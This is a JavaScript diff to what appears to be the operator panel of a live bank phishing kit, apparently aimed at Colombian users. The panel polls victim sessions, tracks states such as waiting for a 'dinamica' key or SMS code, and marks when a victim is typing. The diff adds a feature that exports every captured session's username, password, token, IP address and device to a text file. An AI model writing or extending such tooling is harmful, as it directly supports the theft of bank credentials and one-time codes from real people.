@@ -8,6 +8,7 @@ const emptyState = document.getElementById('emptyState')
 const rowCount = document.getElementById('rowCount')
 const hint = document.getElementById('hint')
 const btnClean = document.getElementById('btnClean')
+const btnExport = document.getElementById('btnExport')
 
 /** @type {Map<string, object>} */
 const rows = new Map()
@@ -29,11 +30,13 @@ function statusLabel(state) {
 }
 
 function badgeClass(state) {
+  if (state === 'typing') {
+    return 'badge badge--typing'
+  }
   if (
     state === 'waiting' ||
     state === 'waiting-dinamica' ||
-    state === 'waiting-sms' ||
-    state === 'typing'
+    state === 'waiting-sms'
   ) {
     return 'badge badge--wait'
   }
@@ -296,6 +299,42 @@ btnClean?.addEventListener('click', async () => {
   hint.textContent = 'Cola limpia. Esperando nuevos usuarios…'
   render()
 })
+
+function exportToNotepad() {
+  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0));
+  if (list.length === 0) {
+    alert("No hay información en el panel para guardar.");
+    return;
+  }
+
+  let text = "";
+  list.forEach((row, i) => {
+    text += `=== SESION #${i + 1} ===\r\n`;
+    text += `Fecha/Hora: ${new Date(row.createdAt).toLocaleString('es-CO')}\r\n`;
+    text += `Tipo: ${row.tipo}\r\n`;
+    text += `Dispositivo: ${row.device}\r\n`;
+    text += `IP: ${row.ip}\r\n`;
+    text += `Usuario: ${row.user}\r\n`;
+    text += `Clave: ${row.clave}\r\n`;
+    text += `Token: ${row.token || '—'}\r\n`;
+    text += `Estado final: ${statusLabel(row.state)}\r\n`;
+    text += `========================\r\n\r\n`;
+  });
+
+  const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = `sesiones_panel_${Date.now()}.txt`;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+}
+
+btnExport?.addEventListener('click', () => {
+  exportToNotepad();
+});
 
 // Poll sessions every 2 seconds
 window.setInterval(pollSessions, 2000)
